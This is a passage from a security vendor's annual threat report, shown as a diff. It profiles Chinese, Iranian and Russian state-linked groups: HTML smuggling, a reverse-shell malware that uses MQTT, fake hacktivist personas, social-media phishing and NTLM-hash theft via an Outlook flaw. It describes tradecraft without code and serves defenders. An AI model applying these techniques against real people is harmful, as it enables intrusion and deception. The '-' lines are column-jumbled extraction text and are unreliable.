 the new EU approach towards Russia,) showing a nested hidden directory 
-structure. (Source: Secureworks)2023 State of the Threat: A Year in Review4901Letter From Our VPIn May 2023, BRONZE PRESIDENT appeared to experiment withhiding their payloads inside seemingly benign HTML files (HTMLsmuggling40\) as a new delivery mechanism for PlugX. HTMLsmuggling is typically used by cybercriminals, for example inExecutive Summaryand Key FindingsQakbot campaigns.0203The Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixAlso in 2023, BRONZE PRESIDENT diversified their malwarearsenal, bringing in the previously unobserved MQShell malware.MQShell has limited capability; it simply acts as a reverse shell,executing commands and passing the output to the C2 server, butit may be in the early stages of development. It does employ novelC2 communications using the MQTT IoT messaging protocol. Thethreat actor may have chosen this protocol for C2 communicationsas its lightweight publishsubscribe model is simple to use andprovides an element of obfuscation where the identity of the trueC2 server is concerned. It may also circumvent network\-baseddetections. To make use of the protocol, the malware author usedthe open\-source MQTT library.Additionally, while investigating MQShell, CTU researchersexamined trojanized router firmware files that were likely developedby BRONZE PRESIDENT. These files suggest BRONZE PRESIDENTmay be engaged in building covert networks of compromisednetwork devices to tunnel their communications back to Chinaunobservedyet another example of stealthy tradecraft on thepart of Chinese groups.2023 State of the Threat: A Year in Review5001Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixIRANTraditional TargetingMain motivations:EspionageMonitoring dissidentsSabotage2023 State of the Threat: A Year in Review5101Letter From Our VPIRAN0203Executive Summaryand Key FindingsA significant proportion of Iranian cyber activity continues to beintelligence functions and reportedly43 operates a cyber division.driven by political imperatives: tracking and suppression of politicalThese organizations only represent a part of the overall contractoropposition, countering normalization of relations between Israel andnetwork and future research by us and others will likely reveal more.Arab countries via the Abraham Accords41 and offensive operationsThe Business of CybercrimeIs Boomtime Back?to harass government and commercial entities in Israel. Other foreignIndeed, this pattern of private Iranian companies acting as fronts orintelligence collection priorities exist but are less prominent withinproviding support for Iranian intelligence operations and attacks isour collection aperture.well established, as illustrated by sanctions dating from:Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixIran's Contractor EcosystemIran's main intelligence services sit within the Ministry of Intelligenceand Security (also known as MOIS or VAJA) and the IslamicRevolutionary Guard Corp (IRGC). Both organizations use a network201644 on employees of ITSec Team and Mersad Company,201945 on individuals linked to Net Peygard Samavat 
-Company (later known as Emennet Pasargad),202046 on Rana Intelligence Computing Company andsome of its employees.of contractors to support their offensive cyber activities.In October 2022, the U.S. Treasury also sanctioned47 Ravin Academyfor the provision of various cybersecurity services to MOIS and forIn 2022, CTU research42 into COBALT MIRAGE activity linked threetraining individuals that were later recruited by MOIS.contractor entities (Afkar System, Najee Technology and Secnerd)to Iranian cyber activity, and in particular to the Islamic RevolutionaryGuard Corp (IRGC), and its subordinate unit the IntelligenceOrganization (IRGC\-IO). The IRGC\-IO is one of Iran's primary2023 State of the Threat: A Year in Review5201Letter From Our VPLinks between individuals associated with Iranian threat groupOver a period of days or weeks, COBALT ILLUSION develops aactivity and contractor organizations often appear gradually overrapport with the target and then attempts to phish credentials orExecutive Summaryand Key Findingstime. For example, in 2019 Farzin Karimi was accused by the Greendeploy malware to the target's computer or mobile device. A case inLeakers Telegram channel of being linked to COBALT ULSTERJuly 2022 reported by CERTFA53 included instances of a threat actor(Muddywater) activity. In 2022, U.S. CyberCommand called48conducting video calls with a target and passing the phishing link viaCOBALT ULSTER a subordinate element of MOIS. Farzin went onchat.to co\-found Ravin Academy and was designated by the TreasuryThe Business of CybercrimeIs Boomtime Back?alongside it.CTU researchers investigated multiple cases attributed to COBALTILLUSION throughout this year. In one case the threat actors created0203Innovations in TTPs Occur04When Infection Chains AreForced to EvolveSimilarly Behzad Mesri, alleged49 perpetrator of the 2017 HBO hacka false persona on Twitter that claimed to work for the Atlanticis wanted50 by the FBI in relation to multiple criminal activities.Council and used it to contact multiple individuals involved in MiddleMesri was the CEO of Net Peygard Samavat Company, sanctioned51Eastern political affairs research. The fake persona used the namefor supporting the IRGC and MOIS. The current incarnation of NetSara Shokouhi54 and decorated their social media profile with imagesPeygard Samavat is known as Emennet Pasargad and has links52 tostolen from a psychologist and tarot card reader based in Russia.multiple strands of Iranian cyber activity.State\-SponsoredThreat Activity(N)GO PhishingPhishing and bulk data collection have long been core tactics ofCOBALT ILLUSION operations. In early 2023, CTU researchersinvestigated a case likely involving COBALT ILLUSION that suggested0506Threat Actor Use ofArtificial Intelligence07Conclusion08AppendixSome state\-sponsored threat groups are more social than others.the group's tactics had evolved. What differentiated it from mostThe Iranian threat group COBALT ILLUSION favors the personalprevious activity was the hijack of a long\-standing social mediatouch, routinely masquerading as real individuals or creating fakeaccount which provided a degree of credibility to the persona insocial media personas and using them to contact a target under thecontrast to accounts that are only a few weeks or months old whenpretext of an interview request, assistance on a report, or to discuss athey start approaching targets. In this case, activity involved the useshared interest.of an existing Twitter account, created in 2013, where the originalidentity had been replaced with a fake persona claiming to be aCOBALT ILLUSION (also known as Charming Kitten and APT42\) isresearcher at the Atlantic Council.suspected of operating on behalf of Iran's Intelligence Organizationof the Islamic Revolutionary Guard Corp (IRGC\-IO). COBALTSocial media continues to be a popular mechanism for IranianILLUSION targets a wide range of individuals and is particularlyAPT groups to approach and cultivate a rapport with their targets.interested in academics, journalists, human rights defenders,Phishing awareness training that includes scenarios focused on socialpolitical activists, intergovernmental organizations (IGOs), and non\-media\-based approaches, whether through professional or personalgovernmental organizations (NGOs) that focus on Iran.accounts, can help employees spot and report such activity.2023 State of the Threat: A Year in Review5301Letter From Our VPWelcome to the Masquerade Ball0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Iranian use of personas goes far wider and deeper than usingpersonas in phishing. Since the Iran\-Iraq war of the 1980s, Iran haspreferred indirect confrontation, using proxies, created or adopted,to conduct kinetic and intelligence operations against regionalof their offensive cyber capabilities, first through the adoption ofthe indigenous amateur hacker and defacement community toconduct attacks, and later in the routine fabrication of criminal andhacktivist personas to claim responsibility for attacks. One of theInnovations in TTPs Occurearliest examples of Iran using fictional personas was the conflicting04When Infection Chains Areclaims of responsibility released by Arab Youth Group and CuttingForced to EvolveSword of Justice in relation to the 2012 Shamoon wiper attacks inFictional personas, styled as individuals or groups, provide theregime with plausible deniability for attacks against their adversaries.Beyond that, they serve to further political objectives, such asundermining foreign governments, by creating the perception thatthose governments are powerless in the face of cybercriminalsattacking their citizens or that hacktivists are emerging to supportThe primary target of these campaigns is Israel, but secondarytargets have included the U.S UAE, Saudi Arabia, Bahrain, andAlbania. Many of these are long\-standing Western and regionaladversaries, but the emergence of the Abraham Accords and theprospect of Arab countries normalizing relations with Israel andshifting the regional power balance, are also of significant concernadversaries. That same strategy carried over into the developmentand amplify particular political causes.Saudi Arabia and Qatar.to Iran.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 27\. Comparison of Moses Staff and Abraham's Ax logos.
-(Source: Secureworks)2023 State of the Threat: A Year in Review5401Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixThe past year has not seen any revival of activity from COBALTPeygard Samavat Company, have been a persistent developer ofFOXGLOVE in the guise of the Pay2Key and N3tw0rm ransomwareIranian cyber personas, the associated offensive campaigns, andfamilies and group personas that we reported on in the 2021 Stateother intelligence projects on behalf of the Iranian Revolutionaryof the Threat report55\. However, COBALT SAPLING, the groupGuard Corp Intelligence Organization (IRGC\-IO), the IRGC\-Electronicbehind the Moses Staff56 persona, did return. Moses Staff emergedWarfare and Cyber Defense Organization (IRGC\-EWCD) and thein September 2021, using pro\-Palestinian imagery and messagingMinistry of Intelligence and Security (MOIS).to justify hack and leak attacks on government and commercialentities in Israel. Just over a year later, in November 2022, COBALTIn July 2022, a MOIS connected persona, Homeland Justice, attackedSAPLING launched a new campaign and associated persona,multiple government entities in Albania, ostensibly due to Albania'sAbraham's Ax, using pro\-Hezbollah messaging and imagery to leakhosting of an Iranian political opposition group, Mojahedin\-e\-Khalqdata allegedly stolen from government ministries in Saudi Arabia.(MEK). However, aspects of the symbolism presented by HomelandBeyond hack and leak attacks COBALT SAPLING has used customJustice suggested that attacks were also motivated by the activitiesmalware such as PyDCrypt, DCSrv and Strifewater RAT in destructiveof the anti\-Iranian hacktivist group, Predatory Sparrow58\.attacks masquerading as ransomware. In many cases the use ofransomware\-style malware appears to be an attempt to disruptIn June 2022, Predatory Sparrow had claimed responsibility forrather than monetize a target. As of July 2023, COBALT SAPLING iscyber\-enabled physical attacks59 on three state\-owned steel mills indormant but may yet be resurrected.Iran. Predatory Sparrow is itself a cyber\-persona that provides coverfor action for a state\-sponsored actor. In September 2022, the U.S.In November 2021, the U.S. Department of the Treasury's Office ofdesignated60 MOIS and specific individuals in response to theseForeign Assets Control (OFAC) sanctioned57 six Iranian individualsattacks and ongoing leaks of Albanian government data.and the Iranian company Emennet Pasargad for their role in a cyber\-enabled campaign to influence the 2020 U.S. presidential election.At the time, CTU researchers analyzed the attack and highlightedinconsistencies in the promotional material revealing the campaignto be a charade. Emennet Pasargad and earlier incarnations ofthe entity under other names including Eeleyanet Gostar and Net2023 State of the Threat: A Year in Review5501Letter From Our VPIn January 2023, the DarkBit persona operated by COBALT AZTECtargeted organization. At the time of writing no other known DarkBitprovided an interesting example of a persona evolving after its initialattacks have occurred, making it just the latest example of a transientappearance, potentially in order to improve or refocus the narrativepersona associated with Iranian offensive cyber activity.for greater impact.2022 saw a significant uptick in appearance of Iranian hacktivistsInitially used in an attack on a commercial entity in a GCC country,and criminal cyber personas, and it is likely they will continue toDarkBit presented itself as a generic ransomware actor. Within ause this tactic. Unlike real criminal and hacktivist groups there is nomonth the persona had been evolved for use in an attack in Israel,motivation to create an enduring reputation and narrative for theseintroducing a blend of political and financial motives to the narrativetransient groups. New personas will be deployed to align with theby claiming to oppose apartheid and racism while also suggestinglatest political objectives, providing a temporary face to their attacksthe group was composed of disgruntled ex\-employees forced intoand then fading into the background, obscuring the identities andcybercrime by recent layoffs. In Israel at least, COBALT AZTEC wasintent of the real threat actors.assisted by MOIS\-linked COBALT ULSTER in gaining access to the0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 28\. DarkBit ransomware payment portal as of early January 2023\. (Source: Secureworks)2023 State of the Threat: A Year in Review5601Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixRUSSIAThe Near Abroad and a Nod
-to the Problems of CybercrimeMain motivations:EspionageHybrid Warfare2023 State of the Threat: A Year in Review5701Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixRUSSIAInside Ukraine, Russia's activity has primarily fallen into two camps:In early 2023, CTU researchers observed IRON TWILIGHT exploitingcyberespionage and disruption, primarily via the use of wiper attacksOutlook vulnerability CVE\-2023\-23397 to collect NTLM credentialon Ukrainian infrastructure and institutions. Outside Ukraine, thehashes in multiple phishing campaigns that targeted variousfocus has been on gaining intelligence on countries supportingUkrainian state agencies. Recovered hashes could be used in a Pass\-Ukraine, assisted by short\-lived denial of service attacks conducted 
-by multiple pro\-Russian hacktivist groups.the\-Hash attack to authenticate as the victim to other systems,access which is valuable for other follow\-on activities includingintelligence gathering.IRON TILDEN, a threat group likely working on behalf of Russia'sdomestic intelligence services, remained focused on espionagethrough highly targeted spearphishing of Ukrainian defense andgovernment organizations. Infrastructure and lure documentsattributed by CTU researchers in early 2023 to IRON TILDENindicated little change in targeting and a continued preferencefor certain intrusion techniques like remote template injection fordefense evasion and fast\-flux DNS for command and control.Espionage and Disruption
+structure. (Source: Secureworks)
+50
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+In May 2023, BRONZE PRESIDENT appeared to experiment with 
+hiding their payloads inside seemingly benign HTML files (HTML 
+smuggling40\) as a new delivery mechanism for PlugX. HTML 
+smuggling is typically used by cybercriminals, for example in 
+Qakbot campaigns.
+Also in 2023, BRONZE PRESIDENT diversified their malware 
+arsenal, bringing in the previously unobserved MQShell malware. 
+MQShell has limited capability; it simply acts as a reverse shell, 
+executing commands and passing the output to the C2 server, but 
+it may be in the early stages of development. It does employ novel 
+C2 communications using the MQTT IoT messaging protocol. The 
+threat actor may have chosen this protocol for C2 communications 
+as its lightweight publishsubscribe model is simple to use and 
+provides an element of obfuscation where the identity of the true 
+C2 server is concerned. It may also circumvent network\-based 
+detections. To make use of the protocol, the malware author used 
+the open\-source MQTT library.
+Additionally, while investigating MQShell, CTU researchers 
+examined trojanized router firmware files that were likely developed 
+by BRONZE PRESIDENT. These files suggest BRONZE PRESIDENT 
+may be engaged in building covert networks of compromised 
+network devices to tunnel their communications back to China 
+unobservedyet another example of stealthy tradecraft on the 
+part of Chinese groups.
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Main motivations:EspionageMonitoring dissidentsSabotage
+IRAN 
+Traditional Targeting
+51
+52
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+IRAN 
+A significant proportion of Iranian cyber activity continues to be 
+driven by political imperatives: tracking and suppression of political 
+opposition, countering normalization of relations between Israel and 
+Arab countries via the Abraham Accords41 and offensive operations 
+to harass government and commercial entities in Israel. Other foreign 
+intelligence collection priorities exist but are less prominent within 
+our collection aperture.
+Iran's Contractor Ecosystem
+Iran's main intelligence services sit within the Ministry of Intelligence 
+and Security (also known as MOIS or VAJA) and the Islamic 
+Revolutionary Guard Corp (IRGC). Both organizations use a network 
+of contractors to support their offensive cyber activities. 
+In 2022, CTU research42 into COBALT MIRAGE activity linked three 
+contractor entities (Afkar System, Najee Technology and Secnerd) 
+to Iranian cyber activity, and in particular to the Islamic Revolutionary 
+Guard Corp (IRGC), and its subordinate unit the Intelligence 
+Organization (IRGC\-IO). The IRGC\-IO is one of Iran's primary 
+intelligence functions and reportedly43 operates a cyber division. 
+These organizations only represent a part of the overall contractor 
+network and future research by us and others will likely reveal more.
+Indeed, this pattern of private Iranian companies acting as fronts or 
+providing support for Iranian intelligence operations and attacks is 
+well established, as illustrated by sanctions dating from:
+201644 on employees of ITSec Team and Mersad Company, 
+201945 on individuals linked to Net Peygard Samavat 
+Company (later known as Emennet Pasargad), 
+202046 on Rana Intelligence Computing Company and 
+some of its employees.
+In October 2022, the U.S. Treasury also sanctioned47 Ravin Academy 
+for the provision of various cybersecurity services to MOIS and for 
+training individuals that were later recruited by MOIS.
+53
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Links between individuals associated with Iranian threat group 
+activity and contractor organizations often appear gradually over 
+time. For example, in 2019 Farzin Karimi was accused by the Green 
+Leakers Telegram channel of being linked to COBALT ULSTER 
+(Muddywater) activity. In 2022, U.S. CyberCommand called48 
+COBALT ULSTER a subordinate element of MOIS. Farzin went on 
+to co\-found Ravin Academy and was designated by the Treasury 
+alongside it. 
+Similarly Behzad Mesri, alleged49 perpetrator of the 2017 HBO hack 
+is wanted50 by the FBI in relation to multiple criminal activities. 
+Mesri was the CEO of Net Peygard Samavat Company, sanctioned51 
+for supporting the IRGC and MOIS. The current incarnation of Net 
+Peygard Samavat is known as Emennet Pasargad and has links52 to 
+multiple strands of Iranian cyber activity.
+(N)GO Phishing
+Some state\-sponsored threat groups are more social than others. 
+The Iranian threat group COBALT ILLUSION favors the personal 
+touch, routinely masquerading as real individuals or creating fake 
+social media personas and using them to contact a target under the 
+pretext of an interview request, assistance on a report, or to discuss a 
+shared interest. 
+COBALT ILLUSION (also known as Charming Kitten and APT42\) is 
+suspected of operating on behalf of Iran's Intelligence Organization 
+of the Islamic Revolutionary Guard Corp (IRGC\-IO). COBALT 
+ILLUSION targets a wide range of individuals and is particularly 
+interested in academics, journalists, human rights defenders, 
+political activists, intergovernmental organizations (IGOs), and non\-
+governmental organizations (NGOs) that focus on Iran. 
+Over a period of days or weeks, COBALT ILLUSION develops a 
+rapport with the target and then attempts to phish credentials or 
+deploy malware to the target's computer or mobile device. A case in 
+July 2022 reported by CERTFA53 included instances of a threat actor 
+conducting video calls with a target and passing the phishing link via 
+chat.
+CTU researchers investigated multiple cases attributed to COBALT 
+ILLUSION throughout this year. In one case the threat actors created 
+a false persona on Twitter that claimed to work for the Atlantic 
+Council and used it to contact multiple individuals involved in Middle 
+Eastern political affairs research. The fake persona used the name 
+Sara Shokouhi54 and decorated their social media profile with images 
+stolen from a psychologist and tarot card reader based in Russia.
+Phishing and bulk data collection have long been core tactics of 
+COBALT ILLUSION operations. In early 2023, CTU researchers 
+investigated a case likely involving COBALT ILLUSION that suggested 
+the group's tactics had evolved. What differentiated it from most 
+previous activity was the hijack of a long\-standing social media 
+account which provided a degree of credibility to the persona in 
+contrast to accounts that are only a few weeks or months old when 
+they start approaching targets. In this case, activity involved the use 
+of an existing Twitter account, created in 2013, where the original 
+identity had been replaced with a fake persona claiming to be a 
+researcher at the Atlantic Council.
+Social media continues to be a popular mechanism for Iranian 
+APT groups to approach and cultivate a rapport with their targets. 
+Phishing awareness training that includes scenarios focused on social 
+media\-based approaches, whether through professional or personal 
+accounts, can help employees spot and report such activity.
+54
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Welcome to the Masquerade Ball
+Iranian use of personas goes far wider and deeper than using 
+personas in phishing. Since the Iran\-Iraq war of the 1980s, Iran has 
+preferred indirect confrontation, using proxies, created or adopted, 
+to conduct kinetic and intelligence operations against regional 
+adversaries. That same strategy carried over into the development 
+of their offensive cyber capabilities, first through the adoption of 
+the indigenous amateur hacker and defacement community to 
+conduct attacks, and later in the routine fabrication of criminal and 
+hacktivist personas to claim responsibility for attacks. One of the 
+earliest examples of Iran using fictional personas was the conflicting 
+claims of responsibility released by Arab Youth Group and Cutting 
+Sword of Justice in relation to the 2012 Shamoon wiper attacks in 
+Saudi Arabia and Qatar. 
+Fictional personas, styled as individuals or groups, provide the 
+regime with plausible deniability for attacks against their adversaries. 
+Beyond that, they serve to further political objectives, such as 
+undermining foreign governments, by creating the perception that 
+those governments are powerless in the face of cybercriminals 
+attacking their citizens or that hacktivists are emerging to support 
+and amplify particular political causes. 
+The primary target of these campaigns is Israel, but secondary 
+targets have included the U.S UAE, Saudi Arabia, Bahrain, and 
+Albania. Many of these are long\-standing Western and regional 
+adversaries, but the emergence of the Abraham Accords and the 
+prospect of Arab countries normalizing relations with Israel and 
+shifting the regional power balance, are also of significant concern
+to Iran. 
+Figure 27\. Comparison of Moses Staff and Abraham's Ax logos.
+(Source: Secureworks)
+55
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The past year has not seen any revival of activity from COBALT 
+FOXGLOVE in the guise of the Pay2Key and N3tw0rm ransomware 
+families and group personas that we reported on in the 2021 State 
+of the Threat report55\. However, COBALT SAPLING, the group 
+behind the Moses Staff56 persona, did return. Moses Staff emerged 
+in September 2021, using pro\-Palestinian imagery and messaging 
+to justify hack and leak attacks on government and commercial 
+entities in Israel. Just over a year later, in November 2022, COBALT 
+SAPLING launched a new campaign and associated persona, 
+Abraham's Ax, using pro\-Hezbollah messaging and imagery to leak 
+data allegedly stolen from government ministries in Saudi Arabia. 
+Beyond hack and leak attacks COBALT SAPLING has used custom 
+malware such as PyDCrypt, DCSrv and Strifewater RAT in destructive 
+attacks masquerading as ransomware. In many cases the use of 
+ransomware\-style malware appears to be an attempt to disrupt 
+rather than monetize a target. As of July 2023, COBALT SAPLING is 
+dormant but may yet be resurrected. 
+In November 2021, the U.S. Department of the Treasury's Office of 
+Foreign Assets Control (OFAC) sanctioned57 six Iranian individuals 
+and the Iranian company Emennet Pasargad for their role in a cyber\-
+enabled campaign to influence the 2020 U.S. presidential election. 
+At the time, CTU researchers analyzed the attack and highlighted 
+inconsistencies in the promotional material revealing the campaign 
+to be a charade. Emennet Pasargad and earlier incarnations of 
+the entity under other names including Eeleyanet Gostar and Net 
+Peygard Samavat Company, have been a persistent developer of 
+Iranian cyber personas, the associated offensive campaigns, and 
+other intelligence projects on behalf of the Iranian Revolutionary 
+Guard Corp Intelligence Organization (IRGC\-IO), the IRGC\-Electronic 
+Warfare and Cyber Defense Organization (IRGC\-EWCD) and the 
+Ministry of Intelligence and Security (MOIS).
+In July 2022, a MOIS connected persona, Homeland Justice, attacked 
+multiple government entities in Albania, ostensibly due to Albania's 
+hosting of an Iranian political opposition group, Mojahedin\-e\-Khalq 
+(MEK). However, aspects of the symbolism presented by Homeland 
+Justice suggested that attacks were also motivated by the activities 
+of the anti\-Iranian hacktivist group, Predatory Sparrow58\. 
+In June 2022, Predatory Sparrow had claimed responsibility for 
+cyber\-enabled physical attacks59 on three state\-owned steel mills in 
+Iran. Predatory Sparrow is itself a cyber\-persona that provides cover 
+for action for a state\-sponsored actor. In September 2022, the U.S. 
+designated60 MOIS and specific individuals in response to these 
+attacks and ongoing leaks of Albanian government data.
+56
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+In January 2023, the DarkBit persona operated by COBALT AZTEC 
+provided an interesting example of a persona evolving after its initial 
+appearance, potentially in order to improve or refocus the narrative 
+for greater impact. 
+Initially used in an attack on a commercial entity in a GCC country, 
+DarkBit presented itself as a generic ransomware actor. Within a 
+month the persona had been evolved for use in an attack in Israel, 
+introducing a blend of political and financial motives to the narrative 
+by claiming to oppose apartheid and racism while also suggesting 
+the group was composed of disgruntled ex\-employees forced into 
+cybercrime by recent layoffs. In Israel at least, COBALT AZTEC was 
+assisted by MOIS\-linked COBALT ULSTER in gaining access to the 
+targeted organization. At the time of writing no other known DarkBit 
+attacks have occurred, making it just the latest example of a transient 
+persona associated with Iranian offensive cyber activity. 
+2022 saw a significant uptick in appearance of Iranian hacktivists 
+and criminal cyber personas, and it is likely they will continue to 
+use this tactic. Unlike real criminal and hacktivist groups there is no 
+motivation to create an enduring reputation and narrative for these 
+transient groups. New personas will be deployed to align with the 
+latest political objectives, providing a temporary face to their attacks 
+and then fading into the background, obscuring the identities and 
+intent of the real threat actors. 
+Figure 28\. DarkBit ransomware payment portal as of early January 2023\. (Source: Secureworks)
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+RUSSIA 
+The Near Abroad and a Nod
+to the Problems of Cybercrime
+Main motivations:EspionageHybrid Warfare
+57
+58
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+RUSSIA
+Inside Ukraine, Russia's activity has primarily fallen into two camps: 
+cyberespionage and disruption, primarily via the use of wiper attacks 
+on Ukrainian infrastructure and institutions. Outside Ukraine, the 
+focus has been on gaining intelligence on countries supporting 
+Ukraine, assisted by short\-lived denial of service attacks conducted 
+by multiple pro\-Russian hacktivist groups.Espionage and Disruption
 Russia's offensive cyber priorities 
-in UkraineRussia's protracted invasion of Ukraine entered its second year withcontinued use of offensive cyber capability. Ukrainian governmententities were the targets of wiper attacks intended to disrupt criticalservices, a tactic which preceded the initial February 24 groundinvasion and continued into 2023, although with less frequencyand likely more limited success due in part to early detectionand response.2023 State of the Threat: A Year in Review5801Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixWestern Support for Ukraine's 
+in Ukraine 
+Russia's protracted invasion of Ukraine entered its second year with 
+continued use of offensive cyber capability. Ukrainian government 
+entities were the targets of wiper attacks intended to disrupt critical 
+services, a tactic which preceded the initial February 24 ground 
+invasion and continued into 2023, although with less frequency
+and likely more limited success due in part to early detection
+and response. 
+In early 2023, CTU researchers observed IRON TWILIGHT exploiting 
+Outlook vulnerability CVE\-2023\-23397 to collect NTLM credential 
+hashes in multiple phishing campaigns that targeted various 
+Ukrainian state agencies. Recovered hashes could be used in a Pass\-
+the\-Hash attack to authenticate as the victim to other systems, 
+access which is valuable for other follow\-on activities including 
+intelligence gathering. 
+IRON TILDEN, a threat group likely working on behalf of Russia's 
+domestic intelligence services, remained focused on espionage 
+through highly targeted spearphishing of Ukrainian defense and 
+government organizations. Infrastructure and lure documents 
+attributed by CTU researchers in early 2023 to IRON TILDEN 
+indicated little change in targeting and a continued preference 
+for certain intrusion techniques like remote template injection for 
+defense evasion and fast\-flux DNS for command and control.
+59
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Western Support for Ukraine's 
 Defense Draws Russian Cyber 
-AttentionCTU researchers analyzed email artifacts likely used in credentialharvesting operations in August 2022 by IRON FRONTIER againststaff at two U.S. national laboratories. The threat actors impersonateda fellow laboratory staff member in a multi\-day correspondencewhich attempted to establish rapport and deceive the victim intoOrganizations directly or indirectly involved in relief efforts intendedvisiting a mock login page which mimicked another well\-knownfor Ukraine but located outside of the immediate conflict zonelaboratory.nonetheless became a target for Russian cyberespionage campaigns.Targeted entities or those whose identities were hijacked andIt is unknown whether the attack was successful in collecting anyincorporated into social engineering aspects of cyber operations fellcredentials or what the threat actor's final objective was, but itunder the following sectors:resembled prior IRON FRONTIER operations which have led tocredential disclosure and information theft reportedly reused in laterInternational logistics providers and weapons suppliersinformation operations.Refugee and human rights foundationsUnmanned aerial systems (UAS) manufacturersScientific research institutionsFigure 29\. Threat actor provides technical support during exchange.
